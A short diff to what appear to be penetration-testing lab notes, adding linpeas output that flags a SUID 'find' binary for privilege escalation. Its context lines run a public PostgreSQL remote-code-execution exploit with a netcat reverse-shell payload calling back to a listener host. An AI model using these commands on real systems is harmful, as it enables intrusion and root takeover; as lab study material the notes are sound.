@@ -259,6 +259,11 @@ PostgreSQL 9.3-11.7 - Remote Code Execution (RCE) (Authenticated)               
 searchsploit -m 50847
 python3 50847.py -i 192.168.207.47 -p 5437 -c 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.45.185 8888>/tmp/f'
 
+# linpeas
+╔══════════╣ SUID - Check easy privesc, exploits and write perms
+╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#sudo-and-suid  
+-rwsr-xr-x 1 root root 309K Feb 16  2019 /usr/bin/find
+
 
 ```
 ### Hetemit
